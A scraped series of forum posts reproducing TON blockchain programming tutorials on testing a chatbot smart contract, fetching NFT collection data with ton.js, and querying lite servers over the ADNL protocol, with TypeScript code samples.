Most often, to create a full-fledged application on TON, you need to write several smart contracts that seem to communicate with each other using messages. In order for the contract to understand what it needs to do when a message arrives, it is recommended to use `op`. `op` is a 32-bit identifier that should be passed in the body of the message.

Thus, inside the message using conditional statements, depending on the smart contract `op` performs different actions.

Therefore, it is important to be able to test messages, which we will do today.

The chatbot smart contract receives any internal message and responds to it with an internal message with the reply text.

## Parsing the contract

##### Standard Library

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbot.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 441

[TON Research](/)

# [Create a Pipeline to work with smart contracts - Lesson 5 Chatbot Smart Contract Testing](/t/create-a-pipeline-to-work-with-smart-contracts-lesson-5-chatbot-smart-contract-testing/441)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:10pm  1

In this tutorial, we will write tests for the chatbot smart contract. The main task is to learn how to look at transactions in `@ton-community/sandbox` under a magnifying glass, and also to figure out how to do tests in the test network or, in other words, onchain tests.

Let’s start with the usual tests.

## [](#check-if-there-is-a-transaction-1)Check if there is a transaction

Since we are using the draft of the previous tutorial as a template, we already have a test framework, open the `main.spec.ts` file and remove from there everything related to the GET method:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

	});
});
```

We see that at the moment, it is checked whether the transaction has been sent to our smart contract. This is due to the `sentMessageResult.transactions` object. Let’s take a close look at it and see what we can test based on this object.

If we just print this object to the console, it will consist of a lot of raw information, for convenience we will use `flattenTransaction` from `@ton-community/test-utils`:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";
import { flattenTransaction } from "@ton-community/test-utils";



describe("msg test", () => {
	it("test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const arr = sentMessageResult.transactions.map(tx => flattenTransaction(tx));
		console.log(arr)


	});
});
```

What you see in the console can be used for tests, let’s check that the message our chatbot sent is equal to reply.

Let’s assemble the message, in accordance with what we collected in the smart contract.

```
	let reply = beginCell().storeUint(0, 32).storeStringTail("reply").endCell();
```

Now, using messages, check that there is such a transaction:

```
import { Cell, Address, toNano, beginCell } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";
import { flattenTransaction } from "@ton-community/test-utils";



describe("msg test", () => {
	it("test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		//const arr = sentMessageResult.transactions.map(tx => flattenTransaction(tx));

		let reply = beginCell().storeUint(0, 32).storeStringTail("reply").endCell();

		expect(sentMessageResult.transactions).toHaveTransaction({
			body: reply,
			from: myContract.address,
			to: senderWallet.address
		});

	});
});
```

Run the tests with the `yarn test` command and see that everything works. Thus, in tests we can collect objects the same as in a smart contract and check that the transaction was.

## [](#onchain-tests-2)Onchain tests

Sometimes a situation may arise that you need to run your smart contracts on the test network (a situation where there are a lot of contracts). Let’s try this with our example.

In the `scripts` folder we will make the `onchain.ts` file, for ease of launch, add to `package.json` `"onchain": "ts-node ./scripts/onchain.ts"`:

```
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest",
	"deploy": "yarn compile && ts-node ./scripts/deploy.ts",
	"onchain": "ts-node ./scripts/onchain.ts"
  },
```

Первое, что нам понадобиться для тестов, это адрес смарт-контракта, соберем его:

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});

	console.log("Address: ",address)

}

onchainScript();
```

The test for the test network will offer us to deploy a transaction via a QR code into our smart contract and check every 10 seconds if the answer has appeared on the network.

> Of course, this is a simplification for an example, the essence is just to show the logic.

Let’s collect a QR code, by which we will conduct a transaction through Tonkeeper. For our example, it is important that the amount of TON is sufficient so as not to throw an exception written in the contract.

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});

	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
	});

	console.log("Transaction link:",transactionLink);


	qrcode.generate(transactionLink, {small: true }, (qr) => {
		console.log(qr);
	});

}

onchainScript();
```

In order to receive data from the test network, we need some kind of data source. Data can be obtained via ADNL from Liteservers, but we will talk about ADNL in the following tutorials. In this tutorial, we will use the TON Center API.

```
	const API_URL = "https://testnet.toncenter.com/api/v2"
```

We will make requests through the Http client [axios](https://axios-http.com/ru/docs/intro), install: `yarn add axios`.

Among the Toncenter methods, we need getTransactions with the limit 1 parameter, i.e. we will take the last transaction. Let’s write two helper functions for requesting information:

```
// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}
```

Now we need a function that will call the API at intervals, for this there is a convenient method [SetInterval](https://developer.mozilla.org/docs/Web/API/setInterval):

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";
import axios, { AxiosRequestConfig, AxiosResponse } from "axios";


const API_URL = "https://testnet.toncenter.com/api/v2"

	// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});


	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
		//bin: beginCell().storeUint(1,32).endCell().toBoc({idx: false}).toString("base64"),
	});

	console.log("Transaction link:",transactionLink);


	qrcode.generate(transactionLink, {small: true }, (qr) => {
		console.log(qr);
	});

	setInterval(async () => {
		const txes = await getTransactions(address.toString());
		if(txes[0].in_msg.source === "EQCj2gVRdFS0qOZnUFXdMliONgSANYXfQUDMsjd8fbTW-RuC") {

		}

	},10000)


}

onchainScript();
```

It is important to note here that the API returns transactions, not messages, so we need to check that IN received the address of our wallet (here I just hardcoded it) and the message (which we put under the QR), and output the message of the first message in OUT. We also display the date, we get:

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";
import axios, { AxiosRequestConfig, AxiosResponse } from "axios";


const API_URL = "https://testnet.toncenter.com/api/v2"

	// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});


	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
		//bin: beginCell().storeUint(1,32).endCell().toBoc({idx: false}).toString("base64"),
	});

	console.log("Transaction link:",transactionLink);


		qrcode.generate(transactionLink, {small: true }, (qr) => {
			console.log(qr);
		});

		setInterval(async () => {
			const txes = await getTransactions(address.toString());
			if(txes[0].in_msg.source === "EQCj2gVRdFS0qOZnUFXdMliONgSANYXfQUDMsjd8fbTW-RuC") {

            	console.log("Last tx: " + new Date(txes[0].utime * 1000))
            	console.log("IN from: "+ txes[0].in_msg.source+" with msg: "+ txes[0].in_msg.message)
            	console.log("OUT from: "+ txes[0].out_msgs[0].source +" with msg: "+ txes[0].out_msgs[0].message)
			}

		},10000)


	}

	onchainScript();
```

We launch the `yarn onchain` command, scan the QR, send the transaction and wait for our transaction to arrive.

## [](#conclusion-3)Conclusion

I hope you enjoyed the pipeline series. I will be grateful to the asterisk on the repository.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbottest.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/pipeline/chatbottest.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbottest.md)

````
# Chatbot Smart Contract Testing

In this tutorial, we will write tests for the chatbot smart contract. The main task is to learn how to look at transactions in `@ton-community/sandbox` under a magnifying glass, and also to figure out how to do tests in the test network or, in other words, onchain tests.

Let's start with the usual tests.

## Check if there is a transaction

Since we are using the draft of the previous tutorial as a template, we already have a test framework, open the `main.spec.ts` file and remove from there everything related to the GET method:

```ts
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbottest.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 442

[TON Research](/)

# [Get requests in TON - Lesson 1 Requests to the TON blockchain using JS: How to fetch NFT data](/t/get-requests-in-ton-lesson-1-requests-to-the-ton-blockchain-using-js-how-to-fetch-nft-data/442)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:13pm  1

Often Web3 applications or Dapps look architecturally like a Frontend that invokes smart contract methods. Accordingly, you need to be able to make requests for JS in the blockchain. There are few JS examples in TON, so I decided to make a small visual tutorial.

## [](#introduction-1)Introduction

Web 3 applications are often built around the standards that exist in the blockchain, in TON these are NFT and Jetton. For the NFT standard, a common task is to obtain the NFT addresses of a particular collection. Therefore, in this tutorial:

*   we get data about the NFT collection
*   get NFT address by index

and all this in JS.

### [](#install-libraries-2)Install libraries

For requests to TON, we need `typescript` and modules for working with TON.  
To work with Typescript we need:

*   Node.js is the environment in which you will run the TypeScript compiler.
*   The TypeScript Compiler is a Node.js module that compiles TypeScript to JavaScript.

> We will not dive deep into Node.js, instructions for installing it are [here](https://nodejs.org/en/download/):

For the convenience of working with modules, let’s create a `package.json` file using the `npm` package manager:

1.  In the console, go to your project folder (where we will write scripts)
    
2.  Enter in the console
    
    npm init
    
3.  Answer the questions in the console and make sure the `package.json` file is created
    

Now install `typescript`. At the command line, enter the following command:

```
npm install typescript
```

Once installed, you can enter the following command to check the current version of the TypeScript compiler:

```
tsc --v
```

We will also install the ts-node package to execute TypeScript in the console and the REPL for node.js.

```
npm install ts-node
```

It remains to install modules for working with TON:

```
npm install ton ton-core ton-crypto
```

Alright, now we can start scripting.

## [](#get-information-about-the-collection-3)Get information about the Collection

To get information about the NFT collection, we need to call the GET method of the collection’s smart contract, for this we need:

*   use a certain API service that interacts with Light servers of the TON blockchain
*   call the required GET method through this client
*   convert the received data into a readable form

In this tutorial, we will use [toncenter API](https://github.com/toncenter/ton-http-api), for the request we will use the js client, libraries \[ton.js\]([https://www.npmjs.com](https://www.npmjs.com) /package/ton).

Let’s create a `collection.ts` script. Import client from library:

```
import { TonClient } from 'ton';
```

And connect to toncenter:

```
import { TonClient } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});
```

> For simplicity of the example, we do not use an API key, so we will be limited to one request per minute, you can use the bot [Telegram: Contact @tonapibot](https://t.me/tonapibot) to create a key

Now let’s look at the [NFT collection standard on TON](https://github.com/ton-blockchain/TEPs/blob/master/text/0062-nft-standard.md) in order to understand which GET method to call . The standard shows that we need the `get_collection_data()` function, which will return us:

*   `next_item_index` is the number of currently deployed NFT items in the collection.
*   `collection_content` - the contents of the collection in the format corresponding to the [TEP-64](https://github.com/ton-blockchain/TEPs/blob/master/text/0064-token-data-standard.md) standard.
*   `owner_address` - address of the owner of the collection, zero address if there is no owner.

Let’s use the syntactic sugar `async/await` and call this method for some collection in TON:

```
import { TonClient } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('UQApA79Qt8VEOeTfHu9yKRPdJ_dADvspqh5BqV87PgWD998f');

(async () => {
	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_collection_data'
	);

})().catch(e => console.error(e));
```

To convert the data into a readable form, we will use the `ton-core` library:

```
import { Address } from 'ton-core';
```

Let’s convert nextItemIndex to a string, subtract the cell with content, and convert the address:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('UQApA79Qt8VEOeTfHu9yKRPdJ_dADvspqh5BqV87PgWD998f');

(async () => {
	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_collection_data'
	);
	let nextItemIndex = stack.readBigNumber();
	let contentRoot = stack.readCell();
	let owner = stack.readAddress();

	console.log('nextItemIndex', nextItemIndex.toString());
	console.log('contentRoot', contentRoot);
	console.log('owner', owner);
})().catch(e => console.error(e));
```

Run the script with `ts-node`. You should get the following:

## [](#get-the-address-of-the-collection-element-by-index-4)Get the address of the Collection element by index

Now we will solve the problem of getting the address by index, we will again call the GET method of the smart contract of the collection. According to the standard, the `get_nft_address_by_index(int index)` method, which returns `slice address`, is suitable for this task.

This method takes an `int index` parameter and at first glance it looks like you just need to pass a value with type `int` to the smart contract. This is of course true, but since the TON virtual machine uses registers, the value with the `int` type will need to be passed in a tuple. To do this, the `ton.js` library has a `TupleBuilder` .

```
import { TupleBuilder } from 'ton';
```

Write the value 0 to the tuple:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';
import { TupleBuilder } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('EQDvRFMYLdxmvY3Tk-cfWMLqDnXF_EclO2Fp4wwj33WhlNFT');

(async () => {
	let args = new TupleBuilder();
	args.writeNumber(0);


})().catch(e => console.error(e));
```

It remains to make a request and convert the address using `readAddress()`:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';
import { TupleBuilder } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('EQDvRFMYLdxmvY3Tk-cfWMLqDnXF_EclO2Fp4wwj33WhlNFT');

(async () => {
	let args = new TupleBuilder();
	args.writeNumber(0);

	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_nft_address_by_index',
		args.build(),
	);
	let nftAddress = stack.readAddress();

	console.log('nftAddress', nftAddress.toString());
})().catch(e => console.error(e));
```

Run the script with `ts-node`. You should get the following:

## [](#conclusion-5)Conclusion

I publish similar analyzes and tutorials in the telegram channel [Telegram: Contact @ton\_learn](https://t.me/ton_learn), I will be glad for your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/20lesson/tonjs_eng.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/requests/20lesson/tonjs\_eng.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/20lesson/tonjs_eng.md)

```
# Requests to the TON blockchain using JS: How to fetch NFT data

Often Web3 applications or Dapps look architecturally like a Frontend that invokes smart contract methods. Accordingly, you need to be able to make requests for JS in the blockchain. There are few JS examples in TON, so I decided to make a small visual tutorial.

## Introduction

Web 3 applications are often built around the standards that exist in the blockchain, in TON these are NFT and Jetton. For the NFT standard, a common task is to obtain the NFT addresses of a particular collection. Therefore, in this tutorial:

  - we get data about the NFT collection
  - get NFT address by index
 
and all this in JS.

### Install libraries

For requests to TON, we need `typescript` and modules for working with TON.
To work with Typescript we need:
- Node.js is the environment in which you will run the TypeScript compiler.
- The TypeScript Compiler is a Node.js module that compiles TypeScript to JavaScript.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/20lesson/tonjs_eng.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 443

[TON Research](/)

# [Get requests in TON - Lesson 2 ADNL Protocol Intro](/t/get-requests-in-ton-lesson-2-adnl-protocol-intro/443)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:15pm  1

When creating Web3 / blockchain applications, the task arises of obtaining data from the blockchain, for example, to view the last transactions of an account or pull the contract method into the Get method.

For this task, you can use intermediary services that either index the blockchain and give you aggregated information, or are a proxy service that passes your requests through itself. But the use of an intermediary may carry risks, errors or deliberate misrepresentation of facts, may lead to fraud.

TON has network protocols through which you can receive information, roughly speaking, without an intermediary. One such protocol is ADNL. In this tutorial, we will connect to Lightservers and get account information via ANDL.

ADNL is an overlay, peer-to-peer, unreliable (small-size) datagram protocol running on top of a UDP in IPv4 (in the future, IPv6), with an optional TCP fallback if UDP is not available.

Using ANDL, you can receive data from the TON blockchain without intermediaries

## [](#introduction-1)Introduction

Each participant has a 256-bit ADNL Address. The ADNL Protocol allows you to send (unreliable) and receive datagrams using only ADNL Addresses. IP Addresses and Ports are hidden by the ADNL Protocol.

To establish a connection, the handshake mechanism is used. The client connects to the server using TCP and sends an ADNL handshake packet, which contains a server abstract address, a client public key and encrypted AES-CTR session parameters, which are determined by the client.

To connect to Lightclients, we need a list of them:

*   Mainnet: [https://ton.org/global.config.json](https://ton.org/global.config.json)
*   Testnet: [https://ton.org/testnet-global.config.json](https://ton.org/testnet-global.config.json)

[More](https://docs.ton.org/learn/networking/low-level-adnl) about the protocol.

### [](#install-libraries-2)Install libraries

For requests to TON, we need `typescript` and modules for working with TON.  
To work with Typescript we need:

*   Node.js is the environment in which you will run the TypeScript compiler.
*   The TypeScript Compiler is a Node.js module that compiles TypeScript to JavaScript.

> We will not dive deep into Node.js, instructions for installing it are \[here\] ([Node.js — Download](https://nodejs.org/en/download/)):

For the convenience of working with modules, let’s create a `package.json` file using the `npm` package manager:

1.  In the console, go to your project folder (where we will write scripts)
2.  Enter in the console

```
npm init
```

3.  Answer the questions in the console and make sure the `package.json` file is created

Now install `typescript`. At the command line, enter the following command:

```
npm install typescript
```

Once installed, you can enter the following command to check the current version of the TypeScript compiler:

```
	tsc --v
```

We will also install the ts-node package to execute TypeScript in the console and the REPL for node.js.

```
npm install  ts-node
```

Install the module to work with TON:

```
npm install ton ton-core ton-crypto
```

And of course:

```
npm install ton-lite-client
```

## [](#connecting-3)Connecting

`ton-lite-client` we will use to connect via ADNL to light servers. Let’s create an `example.ts` file, import the libraries, and define the `main` function:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

async function main() {

}

main()
```

The library uses the [Round-robin](https://en.wikipedia.org/wiki/Round-robin_scheduling) mechanism to distribute tasks/requests between light servers. Accordingly, we can throw several lighters to which we will connect, but for simplicity of the example, we will take one and add it to the `engines` array.

Let’s go to [https://ton.org/global.config.json](https://ton.org/global.config.json) and take the data on the light server.

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];

}

main()
```

IP must be represented in a different format, for this we will write an auxiliary function `intToIP` and place the object in the `engine` array.

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);

}

main()
```

With `engine` we can initialize the connection:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });


}

main()
```

Now, since we already know how to generate TL packets for the Lite API, we can request information about the current block of the TON masterchain. The masterchain block is used in many further queries as an input parameter to indicate the state (moment) in which we need information.

In this tutorial, our task will be to get the current information about the account, which means we need the last block, we will get it via `getMasterchainInfo()`:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	const master = await client.getMasterchainInfo()
	console.log('master', master.;last)

}

main()
```

Now we will get information about the account, take the account that we will use the smart contract of the Getgems marketplace:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	//console.log('get master info')
	const master = await client.getMasterchainInfo()
	//console.log('master', master)

	const address = Address.parse('EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS');
	const accountState = await client.getAccountState(address, master.last)

	console.log('state', accountState)	

}

main()
```

Run the script with the `ts-node example.ts` command. Now in the console we see information about the account in the last block on the network. The most interesting for us in the future will be lastTx, thanks to this field it will be possible to get the latest transactions, but this will be in the following tutorials.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlintro.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/requests/ADNL/adnlintro.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlintro.md)

```
# ADNL Intro

When creating Web3 / blockchain applications, the task arises of obtaining data from the blockchain, for example, to view the last transactions of an account or pull the contract method into the Get method.

For this task, you can use intermediary services that either index the blockchain and give you aggregated information, or are a proxy service that passes your requests through itself. But the use of an intermediary may carry risks, errors or deliberate misrepresentation of facts, may lead to fraud.

TON has network protocols through which you can receive information, roughly speaking, without an intermediary. One such protocol is ADNL. In this tutorial, we will connect to Lightservers and get account information via ANDL.

ADNL is an overlay, peer-to-peer, unreliable (small-size) datagram protocol running on top of a UDP in IPv4 (in the future, IPv6), with an optional TCP fallback if UDP is not available.

Using ANDL, you can receive data from the TON blockchain without intermediaries

## Introduction

Each participant has a 256-bit ADNL Address. The ADNL Protocol allows you to send (unreliable) and receive datagrams using only ADNL Addresses. IP Addresses and Ports are hidden by the ADNL Protocol.

To establish a connection, the handshake mechanism is used. The client connects to the server using TCP and sends an ADNL handshake packet, which contains a server abstract address, a client public key and encrypted AES-CTR session parameters, which are determined by the client.

To connect to Lightclients, we need a list of them:
- Mainnet: https://ton.org/global.config.json
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlintro.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 444

[TON Research](/)

# [Get requests in TON - Lesson 3 ADNL Run GetMethod](/t/get-requests-in-ton-lesson-3-adnl-run-getmethod/444)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:17pm  1

# [](#get-method-via-adnl-1)Get method via ADNL

## [](#introduction-2)Introduction

A common task in TON is to get data from smart contracts via Get methods. In this tutorial, we will get the data about the NFT collection through the Get method of the collection smart contract. We will also talk about the logic of selling NFTs in TON and how to get information about the sale correctly.

## [](#introduction-3)Introduction

Since the collection smart contract is a standard, we can look at the method signature. `get_collection_data()` returns:

*   `next_item_index` is the number of currently deployed NFT items in the collection.
*   `collection_content` - collection content in TEP-64 format.
*   `owner_address` - address of the owner of the collection, zero address if there is no owner.

In order to make a request, you need the last block, we analyzed how to get it in the previous tutorial:

```
